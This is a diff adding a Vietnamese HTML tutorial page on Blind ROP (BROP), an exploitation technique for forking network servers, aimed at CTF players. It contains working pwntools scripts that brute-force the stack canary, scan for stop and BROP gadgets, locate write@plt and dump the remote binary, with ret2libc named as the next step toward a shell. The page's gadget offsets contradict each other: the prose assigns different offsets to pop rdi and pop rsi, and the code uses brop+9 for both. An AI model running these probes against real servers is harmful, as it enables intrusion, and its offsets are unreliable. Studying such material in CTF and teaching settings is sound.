@@ -1,0 +1,513 @@
+<title>Blind ROP</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.bbox{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.bbox input{font-family:var(--font-mono);font-size:14px;padding:6px 9px;border:1px solid var(--line);border-radius:6px;background:var(--surface);color:var(--fg);width:120px}
+.bbox button{font-family:var(--font-mono);font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);cursor:pointer}
+.bbox .log{margin-top:10px;max-height:170px;overflow:auto;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:8px}
+.bbox .log div{padding:1px 0}
+.bbox .crash{color:var(--danger)}.bbox .hang{color:var(--ok);font-weight:700}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 5 · Blind</div>
+    <h1>Blind ROP</h1>
+    <p class="sub"><strong>BROP</strong>: khai thác <em>không có binary</em> — chỉ một server lắng nghe, có stack overflow, và <mark>tự fork lại</mark> sau mỗi crash (ASLR giữ nguyên trong mỗi lần fork). Hỏi từng chút qua "crash hay treo" để brute <strong>canary</strong>, tìm <strong>stop gadget</strong>, <strong>BROP gadget</strong>, PLT <code>write</code>, rồi dump cả binary. Bài này: thuật toán, số thật, script.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Rất cao (Phase 5)</span>
+      <span class="chip"><b>Điều kiện:</b> fork server + overflow + no-PIE hay info</span>
+      <span class="chip"><b>Cần trước:</b> <a href="rop_basics.html" style="color:inherit">ROP</a> · <a href="canary.html" style="color:inherit">canary</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~90 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Oracle</a><a href="#s4">04 Các bước</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>BROP</strong> (Blind Return-Oriented Programming, Bittau 2014): pwn server mà bạn <em>không có file binary</em>. Chỉ biết: có stack overflow, server <code>fork()</code> xử lý mỗi kết nối nên <strong>địa chỉ không đổi giữa các lần</strong> (ASLR cố định trong vòng đời server), và bạn quan sát được "crash" hay "không crash".</p>
+    <p><strong>Oracle:</strong> gửi payload → server crash (ngắt kết nối) hay treo/trả bình thường = 1 bit thông tin. Từ đó brute từng byte.</p>
+    <p><strong>Trình tự:</strong> brute canary → tìm <em>stop gadget</em> → tìm <em>BROP gadget</em> (pop rdi/rsi/rdx...) → tìm PLT <code>write</code> → dump binary → ROP bình thường.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>Server fork giữ ASLR cố định + oracle crash/not-crash = brute mọi thứ 1 byte/lần.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Điều kiện BROP</span>
+<pre><code># 1) stack overflow (ghi saved RIP)
+# 2) server fork mỗi kết nối → ASLR + canary GIỮ NGUYÊN
+# 3) phân biệt được crash (disconnect) vs không-crash</code></pre></div>
+      <div class="combat-row"><span class="lab">🐤 Brute canary (8 byte)</span>
+<pre><code># ghi đè canary từng byte 0x00..0xff; đúng byte → KHÔNG crash
+# sai → crash. 256×8 = tối đa 2048 lần thử cho 8 byte.</code></pre></div>
+      <div class="combat-row"><span class="lab">🛑 Stop gadget</span>
+        <p>Địa chỉ mà khi "ret" tới, chương trình KHÔNG crash (vd trở lại vòng accept). Dùng làm "nhãn an toàn" để test gadget khác.</p></div>
+      <div class="combat-row"><span class="lab">🧩 BROP gadget</span>
+<pre><code># __libc_csu_init cuối: pop rbx;rbp;r12;r13;r14;r15;ret
+# +0x9 = pop rsi;r15;ret ; +0xb = pop rdi... (dịch offset lấy pop rdi/rsi)</code></pre></div>
+      <div class="combat-row"><span class="lab">📤 Dump binary</span>
+        <p>Tìm PLT write → write(1, addr, len) in bộ nhớ ra socket → tái dựng ELF → ROP/ret2libc như thường.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Pwn mù — chỉ có 1 bit phản hồi</h2>
+  <p>Bình thường bạn có binary → đọc gadget, GOT, offset. BROP là tình huống <em>không có file</em>: dịch vụ mạng nguồn đóng. Nhưng nếu nó <code>fork()</code> cho mỗi client, <strong>bản sao con giữ y nguyên không gian địa chỉ của cha</strong> — ASLR và stack canary KHÔNG đổi giữa các lần kết nối. Nghĩa là bạn có thể thử đi thử lại cùng một địa chỉ. Mỗi lần gửi payload, bạn đọc được 1 bit: <span class="mem-term">crash</span> (kết nối đứt) hay <span class="mem-term">không crash</span> (server trả lời/treo). Từ 1-bit oracle đó, brute dần mọi bí mật.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">BROP</div><p>ROP khi không có binary.</p></div>
+    <div class="card"><div class="term">fork server</div><p>Fork mỗi client, ASLR cố định.</p></div>
+    <div class="card"><div class="term">oracle</div><p>crash/không = 1 bit thông tin.</p></div>
+    <div class="card"><div class="term">stop gadget</div><p>Địa chỉ ret tới mà không crash.</p></div>
+    <div class="card"><div class="term">BROP gadget</div><p>Đuôi csu: pop 6 reg, rút ra pop rdi/rsi.</p></div>
+    <div class="card"><div class="term">probe</div><p>Gửi payload thử một địa chỉ.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Fork phản bội ASLR</h2>
+  <p>ASLR ngẫu nhiên hoá địa chỉ <em>mỗi lần nạp chương trình</em> (<code>execve</code>). Nhưng <code>fork()</code> KHÔNG nạp lại — con sao chép nguyên trạng cha. Server kiểu <code>while(1){ c=accept(); if(fork()==0) handle(c); }</code> giữ cùng base trong suốt vòng đời. Thế là ASLR mất tác dụng chống brute: cùng địa chỉ thử được nhiều lần. Bittau et al. (Oakland 2014) biến điều này + 1-bit oracle thành thuật toán tự động dò gadget, dump binary, rồi exploit — tất cả không cần file. Đề CTF "remote only, no binary" chính là BROP.</p>
+ </div>
+</section>
+
+<!-- 03 Oracle -->
+<section class="block" id="s3">
+ <div class="wrap wide">
+  <div class="secnum">03 / ORACLE · MỤC LÕI</div>
+  <h2>1 bit: crash hay không</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 580 130" role="img" aria-label="gửi payload với địa chỉ thử; nếu ret tới gadget hợp lệ không crash, nếu không thì crash" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="10.5">
+    <rect x="18" y="50" width="130" height="34" rx="6" stroke-width="1.5" stroke="var(--mem)"/><text x="83" y="66" text-anchor="middle" fill="var(--mem)" stroke="none">payload: canary</text><text x="83" y="79" text-anchor="middle" fill="var(--mem)" stroke="none">+ pad + ADDR</text>
+    <path d="M148,67 L210,67" stroke-width="1.3" marker-end="url(#ao)"/>
+    <rect x="212" y="50" width="120" height="34" rx="6" stroke-width="1.5"/><text x="272" y="70" text-anchor="middle" fill="currentColor" stroke="none">ret → ADDR</text>
+    <path d="M332,60 L400,36" stroke="#2f7d4f" stroke-width="1.4" marker-end="url(#ag)"/>
+    <path d="M332,74 L400,98" stroke="#e8663e" stroke-width="1.4" marker-end="url(#ar)"/>
+    <rect x="402" y="22" width="160" height="28" rx="6" stroke-width="1.5" stroke="#2f7d4f"/><text x="482" y="40" text-anchor="middle" fill="#2f7d4f" stroke="none">KHÔNG crash = hợp lệ</text>
+    <rect x="402" y="84" width="160" height="28" rx="6" stroke-width="1.5" stroke="#e8663e"/><text x="482" y="102" text-anchor="middle" fill="#e8663e" stroke="none">crash = loại</text>
+    </g>
+    <defs>
+    <marker id="ao" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor" stroke="none"/></marker>
+    <marker id="ag" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#2f7d4f" stroke="none"/></marker>
+    <marker id="ar" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker>
+    </defs>
+  </svg>
+  <figcaption>Oracle: ret tới ADDR, quan sát crash/không → biết ADDR có phải gadget "an toàn" không.</figcaption>
+  </figure>
+  <h3>Hàm probe (số thật, no-PIE base 0x400000)</h3>
+  <pre><code><span class="k">def</span> probe(addr, pad=b<span class="s">"A"</span>*<span class="d">72</span>, canary=CANARY):
+    <span class="k">try</span>:
+        p = remote(HOST, PORT)             <span class="c"># mỗi lần kết nối mới (fork)</span>
+        p.send(pad + canary + b<span class="s">"B"</span>*<span class="d">8</span> + p64(addr))  <span class="c"># ghi saved RIP = addr</span>
+        r = p.recv(timeout=<span class="d">1</span>)
+        p.close()
+        <span class="k">return</span> <span class="k">len</span>(r) &gt; <span class="d">0</span>                   <span class="c"># có trả về = KHÔNG crash = hợp lệ</span>
+    <span class="k">except</span> EOFError:
+        <span class="k">return</span> <span class="k">False</span>                        <span class="c"># đứt kết nối = crash</span>
+<span class="c"># no-PIE: quét addr từ 0x400000 lên; mỗi addr = 1 probe</span></code></pre>
+  <div class="note"><span class="tag">no-PIE giúp nhiều</span>Nếu no-PIE, code nằm quanh <code>0x400000</code> cố định → quét tuyến tính từ đó. Nếu PIE, phải leak base trước (khó hơn, cần overflow leak). CTF BROP cổ điển thường no-PIE.</div>
+ </div>
+</section>
+
+<!-- 04 Các bước -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / THUẬT TOÁN 5 BƯỚC</div>
+  <h2>Từ 0 tới shell</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Brute canary (và saved rbp, RIP)</h4>
+    <p>Ghi đè từng byte canary 0x00→0xff; byte đúng → không crash. 8 byte × ≤256 = tối đa 2048 probe. Tương tự leak được cả saved RIP (biết vùng code ~0x400xxx).</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Tìm stop gadget</h4>
+    <p>Quét addr; addr nào khi ret tới mà <em>không crash</em> (vd quay lại accept, hoặc gọi lệnh trả data) = stop gadget. Dùng nó làm "nhãn OK" để test các gadget khác.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Tìm BROP gadget</h4>
+    <p>Đuôi <code>__libc_csu_init</code>: <code>pop rbx;rbp;r12;r13;r14;r15;ret</code> (6 pop). Test: đặt <code>[gadget, 6×stop, stop]</code> — nếu chạy qua 6 pop rồi ret an toàn → đúng. Cộng offset: <code>+0x9</code> = <code>pop rsi;pop r15;ret</code>, <code>+0x7</code> = <code>pop rdi;ret</code> (lấy pop rdi/rsi để set tham số).</p></div></div>
+  <div class="step"><div class="n">4</div><div class="body"><h4>Tìm PLT &amp; write</h4>
+    <p>PLT là dãy entry cách nhau 16 byte, "không crash" khi gọi (nhảy tới hàm libc). Xác định <code>write(rdi=1,rsi=addr,rdx=len)</code> bằng cách gọi và xem socket có nhận byte không.</p></div></div>
+  <div class="step"><div class="n">5</div><div class="body"><h4>Dump binary → exploit</h4>
+    <p><code>write(1, 0x400000, 0x1000)</code> in từng trang ra socket → ghép lại thành ELF. Giờ có binary → tìm gadget/GOT thật → ret2libc/ROP bình thường lấy shell.</p></div></div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Mô phỏng brute 1 byte canary</h2>
+  <p>Canary bí mật ẩn (1 byte). Nhập byte đoán → oracle báo crash/không. Hoặc bấm "Tự brute" xem thuật toán quét 0..255.</p>
+  <div class="lab">
+    <div class="bbox" id="bb">
+      <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
+        <span>đoán byte (0x00-0xff):</span>
+        <input id="guessIn" value="0x00">
+        <button id="tryBtn">Thử 1 byte</button>
+        <button id="autoBtn">Tự brute</button>
+        <button id="resetBtn">Đổi canary</button>
+      </div>
+      <div class="log" id="bbLog"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Fork? Overflow? Oracle?</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Server có fork?</h4>
+    <p>Kết nối nhiều lần, thử cùng payload crash — nếu port vẫn mở sau crash = fork server (ASLR cố định).</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Tìm offset overflow</h4>
+    <p>Gửi dần dài hơn đến khi đứt kết nối → biết độ dài tràn tới canary/RIP.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Oracle rõ ràng?</h4>
+    <p>Phân biệt crash (EOF) vs không (có data/timeout). Cần tin cậy để brute.</p></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>BROP: canary → gadget → dump (số thật)</h2>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · brute canary+gadget</button>
+    <button class="tab" data-t="b">B · dump binary</button>
+    <button class="tab" data-t="c">C · pwntools</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — brute canary rồi tìm stop gadget &amp; BROP gadget. no-PIE 0x400000.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+HOST, PORT = <span class="s">"chall.ctf"</span>, <span class="d">1337</span>
+OFF = <span class="d">72</span>                                  <span class="c"># offset tới canary (đo bằng độ dài crash)</span>
+
+<span class="k">def</span> probe(suffix):
+    <span class="k">try</span>:
+        p = remote(HOST, PORT, level=<span class="s">"error"</span>)
+        p.send(b<span class="s">"A"</span>*OFF + suffix)
+        ok = <span class="k">len</span>(p.recv(timeout=<span class="d">1</span>)) &gt; <span class="d">0</span>      <span class="c"># không crash?</span>
+        p.close(); <span class="k">return</span> ok
+    <span class="k">except</span> EOFError:
+        <span class="k">return</span> <span class="k">False</span>
+
+<span class="c"># 1) BRUTE CANARY từng byte (canary byte đầu luôn 0x00)</span>
+canary = b<span class="s">"\x00"</span>
+<span class="k">while</span> <span class="k">len</span>(canary) &lt; <span class="d">8</span>:
+    <span class="k">for</span> b <span class="k">in</span> <span class="k">range</span>(<span class="d">256</span>):
+        <span class="k">if</span> probe(canary + <span class="k">bytes</span>([b])):      <span class="c"># byte đúng → không crash</span>
+            canary += <span class="k">bytes</span>([b]); <span class="k">break</span>
+log.success(<span class="s">f"canary = {canary.hex()}"</span>)      <span class="c"># vd 00 a7 3f 2c 91 e4 5b d8</span>
+
+<span class="c"># 2) TÌM STOP GADGET: quét 0x400500..0x401000, addr nào ret không crash</span>
+base = canary + b<span class="s">"B"</span>*<span class="d">8</span>                   <span class="c"># canary + saved rbp giả</span>
+stop = <span class="k">None</span>
+<span class="k">for</span> addr <span class="k">in</span> <span class="k">range</span>(<span class="d">0x400500</span>, <span class="d">0x401000</span>, <span class="d">1</span>):
+    <span class="k">if</span> probe(base + p64(addr)):
+        stop = addr; log.info(<span class="s">f"stop gadget ~ {hex(addr)}"</span>); <span class="k">break</span>
+
+<span class="c"># 3) TÌM BROP GADGET: [probe_addr, stop*6, stop] chạy qua 6 pop → không crash</span>
+<span class="k">for</span> addr <span class="k">in</span> <span class="k">range</span>(<span class="d">0x400500</span>, <span class="d">0x401000</span>, <span class="d">1</span>):
+    pay = base + p64(addr) + p64(stop)*<span class="d">6</span> + p64(stop)
+    <span class="k">if</span> probe(pay):
+        brop = addr; log.success(<span class="s">f"BROP gadget = {hex(addr)}"</span>); <span class="k">break</span>
+pop_rdi = brop + <span class="d">9</span>                       <span class="c"># offset tới 'pop rdi;ret' (kinh điển +9)</span></code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Canary mẫu <code>00a73f2c91e45bd8</code>, OFF=72, dải quét 0x400500–0x401000 là của server mẫu no-PIE. Byte đầu canary luôn <code>\x00</code> (glibc). Offset <code>+9</code> tới pop rdi là tính chất đuôi <code>__libc_csu_init</code> — xác nhận bằng probe thực. Mỗi probe = 1 kết nối, chạy chậm (hàng nghìn kết nối) → kiên nhẫn.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b">
+<pre><code><span class="c"># BẢN B — tìm PLT write, dump binary ra socket.</span>
+<span class="c"># PLT: dãy entry 16-byte, gọi "không crash". Tìm write bằng cách gọi</span>
+<span class="c"># write(1, ADDR, LEN) và xem socket nhận byte.</span>
+<span class="k">def</span> call(func, rdi, rsi, rdx_stop):
+    <span class="c"># dùng BROP gadget: set rsi (brop+9 → pop rsi;r15), pop rdi (brop+? )</span>
+    pay  = base
+    pay += p64(brop+<span class="d">9</span>) + p64(rsi) + p64(<span class="d">0</span>)    <span class="c"># pop rsi; pop r15</span>
+    pay += p64(pop_rdi) + p64(rdi)               <span class="c"># pop rdi</span>
+    pay += p64(func) + p64(stop)                 <span class="c"># gọi func, rồi stop</span>
+    p = remote(HOST, PORT, level=<span class="s">"error"</span>)
+    p.send(b<span class="s">"A"</span>*OFF + pay); <span class="k">return</span> p
+
+<span class="c"># quét PLT tìm write: gọi plt_entry(1, 0x400000, ...) → nếu socket nhận ELF magic</span>
+<span class="k">for</span> plt <span class="k">in</span> <span class="k">range</span>(<span class="d">0x400400</span>, <span class="d">0x400600</span>, <span class="d">16</span>):
+    p = call(plt, <span class="d">1</span>, <span class="d">0x400000</span>, <span class="d">0</span>)
+    data = p.recv(timeout=<span class="d">1</span>); p.close()
+    <span class="k">if</span> data.startswith(b<span class="s">"\x7fELF"</span>):
+        write_plt = plt; log.success(<span class="s">f"write@plt = {hex(plt)}"</span>); <span class="k">break</span>
+
+<span class="c"># DUMP: write(1, 0x400000+i, 0x100) từng trang → ghép thành file</span>
+dump = b<span class="s">""</span>
+<span class="k">for</span> off <span class="k">in</span> <span class="k">range</span>(<span class="d">0</span>, <span class="d">0x2000</span>, <span class="d">0x100</span>):
+    p = call(write_plt, <span class="d">1</span>, <span class="d">0x400000</span>+off, <span class="d">0x100</span>)
+    dump += p.recv(<span class="d">0x100</span>, timeout=<span class="d">1</span>); p.close()
+<span class="k">open</span>(<span class="s">"dumped"</span>,<span class="s">"wb"</span>).write(dump)      <span class="c"># giờ có ELF → tìm GOT/gadget thật</span></code></pre>
+<div class="note tip"><span class="tag">Sau khi dump</span>Có binary rồi → mọi thứ thành ROP thường: tìm <code>puts@plt</code>/<code>puts@got</code> leak libc, rồi ret2libc <code>system("/bin/sh")</code>. BROP chỉ là giai đoạn "lấy được binary". Xem <a href="ret2libc.html">ret2libc</a>.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwntools không có module BROP sẵn, nhưng helper rút gọn:</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+<span class="c"># dùng vòng probe ở trên; sau khi dump, ELF("dumped") như bình thường.</span>
+e = ELF(<span class="s">"dumped"</span>, checksec=<span class="k">False</span>)
+rop = ROP(e); rop.puts(e.got.puts); rop.raw(main_addr)
+<span class="c"># ... ret2libc 2 giai đoạn ...</span></code></pre>
+<div class="note"><span class="tag">Ghi chú</span>Không có công cụ BROP "bấm nút". Thư viện cộng đồng: <code>braille</code>, <code>abyssal</code>. Cốt lõi vẫn là hàm probe + 5 bước. Hiểu thuật toán quan trọng hơn công cụ.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Oracle không ổn định</h4><p>Timeout/recv không tin cậy → brute sai. Tinh chỉnh timeout, retry mỗi probe.</p></div></div>
